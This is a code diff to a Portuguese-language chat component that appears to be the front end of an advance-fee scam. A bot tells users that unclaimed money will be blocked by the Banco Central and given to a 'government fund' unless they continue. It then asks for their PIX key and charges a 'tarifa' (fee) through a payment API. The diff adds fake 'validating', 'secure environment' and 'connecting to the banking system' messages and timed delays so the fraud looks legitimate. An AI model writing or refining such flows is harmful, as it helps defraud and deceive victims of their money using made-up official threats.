@@ -423,10 +423,16 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
       
       setTimeout(() => {
         setTyping(false);
-        addBotMessage(`**ATENÇÃO:** Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber o valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central.\n\nCaso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos.\n\n**Observação:** Isso só acontecerá se você não concluir a etapa a seguir.`, [
-           { text: "Entendi, quero receber", action: "ask_pix" }
-        ]);
-      }, 1500);
+        addBotMessage("Aguarde um momento, validando sua solicitação no sistema...");
+        
+        setTyping(true);
+        setTimeout(() => {
+          setTyping(false);
+          addBotMessage(`**ATENÇÃO:** Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber o valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central.\n\nCaso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos.\n\n**Observação:** Isso só acontecerá se você não concluir a etapa a seguir.`, [
+             { text: "Entendi, quero receber", action: "ask_pix" }
+          ]);
+        }, 2500);
+      }, 1000);
     }
     else if (action === "ask_pix") {
       setMessages(prev => {
@@ -439,14 +445,20 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
 
       setTimeout(() => {
         setTyping(false);
-        const isCnpj = data.docType.toUpperCase() === 'CNPJ';
-        if (isCnpj) {
-          addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a Chave PIX da empresa (ou a sua Chave PIX de preferência):`, undefined, `/assets/banners/banner_pix.png?v=${Date.now()}`);
-        } else {
-          addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`, undefined, `/assets/banners/banner_pix.png?v=${Date.now()}`);
-        }
-        setAwaitingPix(true);
-      }, 1500);
+        addBotMessage("Registrando o seu aceite e preparando um ambiente seguro...");
+        
+        setTyping(true);
+        setTimeout(() => {
+          setTyping(false);
+          const isCnpj = data.docType.toUpperCase() === 'CNPJ';
+          if (isCnpj) {
+            addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a Chave PIX da empresa (ou a sua Chave PIX de preferência):`, undefined, `/assets/banners/banner_pix.png?v=${Date.now()}`);
+          } else {
+            addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`, undefined, `/assets/banners/banner_pix.png?v=${Date.now()}`);
+          }
+          setAwaitingPix(true);
+        }, 2500);
+      }, 1000);
     }
     else if (action === "submit_pix") {
       const pix = payload || inputValue;
@@ -494,8 +506,13 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
       });
       setTyping(true);
       
-      try {
-        // Fetch BuyPix
+      setTimeout(async () => {
+        setTyping(false);
+        addBotMessage("Conectando ao sistema bancário para gerar a sua transferência, isso pode levar alguns segundos...");
+        
+        setTyping(true);
+        try {
+          // Fetch BuyPix
         const pixRes = await axios.post(`${API_URL}/api/v1/buypix/create`, {
           amount: tarifa,
           payer_document: data.docValue,
@@ -539,6 +556,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
       }
       setTyping(false);
       addBotMessage("", undefined, undefined, "receipt");
+      }, 2000);
     }
     else if (action === "go_whatsapp") {
       fetch(`${API_URL}/api/v1/telemetry/chat`, {
